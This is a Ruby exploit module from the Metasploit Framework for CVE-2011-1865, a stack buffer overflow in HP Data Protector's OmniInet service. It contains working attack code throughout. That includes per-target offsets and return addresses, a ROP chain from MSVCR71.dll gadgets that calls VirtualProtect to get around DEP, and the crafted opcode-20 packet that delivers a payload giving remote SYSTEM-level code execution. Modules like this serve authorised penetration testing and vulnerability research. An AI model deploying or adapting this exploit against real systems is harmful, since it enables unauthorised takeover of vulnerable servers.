##
# $Id: hp_omniinet_4.rb 13096 2011-07-04 22:33:47Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info={})
		super(update_info(info,
			'Name'           => "HP OmniInet.exe Opcode 20 Buffer Overflow",
			'Description'    => %q{
					This module exploits a vulnerability found in HP Data Protector's OmniInet
				process.  By supplying a long string of data as the file path with opcode '20',
				a buffer overflow can occur when this data is being written on the stack where
				no proper bounds checking is done beforehand, which results arbitrary code
				execution under the context of SYSTEM.  This module is also made against systems
				such as Windows Server 2003 or Windows Server 2008 that have DEP and/or ASLR
				enabled by default.
			},
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 13096 $",
			'Author'         =>
				[
					'Oren Isacson',  #Initial discovery, poc
					'muts',          #Initial poc of the ROP exploit w/ dookie
					'dookie',        #Initial poc of the ROP exploit w/ muts
					'sinn3r',        #MSF module with corelanc0d3r  (Also Thx to MC and HD)
					'corelanc0d3r',  #MSF module with sinn3r
				],
			'References'     =>
				[
					[ 'CVE', '2011-1865' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/17468/' ],
					[ 'URL', 'http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities' ],
					[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182' ],
				],
			'Payload'        =>
				{
					'BadChars'        => "\x00",
					'PrependEncoder'  => "\x66\x81\xc4\xb8\x0b\x61\x9d", #add sp, 0xb88; popad; popfd
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "process",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					#If 'Max' gets too long (ie. 10000 bytes), we can get a busted heap
					[
						'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243 on XP SP3 or Win Server 2003',
						{
							'Offset' => 2005,       #For overwriting a RETN (6481 for SEH)
							'Ret'    => 0x7C342629, #RETN - MSVCR71.dll
							'Max'    => 5000,
						}
					],
					[
						'HP Data Protector A.06.10 Build 611 / A.06.11 Build 243 on Win Server 2008',
						{
							'Offset' => 1993,       #For overwriting a RETN (6481 for SEH)
							'Ret'    => 0x7C342629, #RETN - MSVCR71.dll
							'Max'    => 5000,
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Jun 29 2011",
			'DefaultTarget'  => 0))

			register_options([Opt::RPORT(5555)], self.class)
	end

	def nop
		return make_nops(4).unpack("L")[0].to_i
	end

	def exploit

		connect

		#mona.py tekniq
		#https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/
		rop = [
			#Initial setup
			0x7C342629,  # SLIDE
			0x7C342629,  # SLIDE
			0x7C342629,  # SLIDE
			0x7C342629,  # SLIDE
			#ROP begins here
			0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)
			0x7c37a140,  # Make EAX readable
			0x7c37591f,  # PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)
			nop,         # EBP
			0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)
			0x7c37a140,  # <- VirtualProtect() found in IAT
			0x7c3530ea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)
			0x7c346c0b,  # Slide, so next gadget would write to correct stack location
			0x7c376069,  # MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # RETN (MSVCR71.dll)
			nop,         # EDI (filler)
			nop,         # will be patched at runtime (VP), then picked up into ESI
			nop,         # EBX (filler)
			0x7c376402,  # POP EBP # RETN (msvcr71.dll)
			0x7c345c30,  # ptr to push esp #  ret  (from MSVCR71.dll)
			0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)
			0xfffff82f,  # size 20001 bytes
			0x7c351e05,  # NEG EAX # RETN (MSVCR71.dll)
			0x7c354901,  # POP EBX # RETN (MSVCR71.dll)
			0xffffffff,  # pop value into ebx
			0x7c345255,  # INC EBX # FPATAN # RETN (MSVCR71.dll)
			0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)
			0x7c34d201,  # POP ECX # RETN (MSVCR71.dll)
			0x7c38b001,  # RW pointer (lpOldProtect) (-> ecx)
			0x7c34b8d7,  # POP EDI # RETN (MSVCR71.dll)
			0x7c34b8d8,  # ROP NOP (-> edi)
			0x7c344f87,  # POP EDX # RETN (MSVCR71.dll)
			0xffffffc0,  # value to negate, target value : 0x00000040, target: edx
			0x7c351eb1,  # NEG EDX # RETN (MSVCR71.dll)
			0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)
			0x90909090,  # NOPS (-> eax)
			0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)
		].pack('V*')

		#Overflowing path "C:\Program Files\OmniBack\bin\"
		#4807 bytes after target.ret, but we need to use less than that to avoid a busted heap
		sploit = ''
		sploit << rand_text_alpha(target['Offset']-sploit.length)
		sploit << [target.ret].pack('V*')
		sploit << rop
		sploit << payload.encoded
		sploit << rand_text_alpha(target['Max']-sploit.length)

		pkt  = ''
		pkt << Rex::Text.to_unicode("\x00")
		pkt << "\x41\x41"  #Length field place holder
		pkt << "\xff\xfe"
		pkt << Rex::Text.to_unicode("\x32\x00")
		pkt << (Rex::Text.to_unicode("\x20\x61\x00") * 5)
		pkt << Rex::Text.to_unicode("\x20")
		pkt << Rex::Text.to_unicode("20")  #Opcode
		pkt << "\x00"
		pkt << (Rex::Text.to_unicode("\x20\x61\x00") * 7)
		pkt << Rex::Text.to_unicode("\x20\x00")
		pkt << sploit
		pkt << Rex::Text.to_unicode("\x00")
		pkt << (Rex::Text.to_unicode("\x20\x61\x00") * 16)

		#pkt length
		pkt[2,2] = [pkt.length-5].pack('n')

		print_status("Sending packet to #{datastore['RHOST']}...")
		sock.put(pkt)

		#Data Protector lags before triggering the vuln code
		#Long delay seems necessary to ensure we get a shell back
		select(nil,nil,nil,20)

		handler
		disconnect
	end
end